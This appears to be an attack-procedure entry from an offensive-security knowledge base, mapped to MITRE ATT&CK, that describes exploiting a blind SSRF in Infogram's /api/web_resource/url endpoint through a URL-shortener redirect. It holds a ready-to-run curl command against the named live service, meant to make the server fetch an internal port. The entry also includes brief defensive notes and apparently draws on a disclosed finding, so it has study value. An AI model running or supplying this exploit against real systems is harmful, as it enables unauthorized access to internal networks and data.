---
id: proc-uuid-2
tags:
  - ssrf
  - blind-ssrf
  - api-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-trigger-ssrf]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Vulnerability Scanning]]'
updated_at: '2025-12-14T04:39:18.664Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Vulnerability Scanning]]'
---
# Trigger-SSRF-by-Sending-Redirect-URL-to-API-Endpoint

## Summary

This procedure sends a crafted redirect URL to the vulnerable /api/web_resource/url endpoint, causing the server to follow the redirect and fetch internal resources, enabling blind SSRF exploitation.

## Description

The Infogram API validates the 'q' parameter URL but does not resolve redirects, allowing external short URLs to point to internals like http://0:6000/. This leads to port scanning and resource access. Target: Public web API. Outcomes include JSON responses with internal metadata.

## Requirements

1. Valid redirect URL from prior step
2. Access to target API (https://infogram.com)
3. Curl or similar HTTP client

## Defense

Defensive measures and detection strategies:

- Follow redirects in SSRF filters and block internal destinations
- Log and monitor API requests for shortener domains
- Rate-limit suspicious URL parameters

## Objectives

1. Force server-side request to internal endpoint
2. Observe response for internal data leakage
3. Validate SSRF success

## Instructions

### Step 1: Send GET Request with Redirect URL

**Context**: Use curl to query the API, passing the TinyURL as 'q' to trigger the fetch.

**Command** ([[commands/curl-trigger-ssrf]]):
```bash
curl "https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg"
```

> The command sends a GET request; expected output is JSON with details from the internal resource at port 6000.

### Step 2: Analyze Response

**Context**: Parse the JSON for signs of internal access, such as port status or metadata.

No command; inspect output for anomalies like internal host info.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Vulnerability Scanning]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-ssrf]]

## Tools Used


## Tags

- ssrf
- exploitation
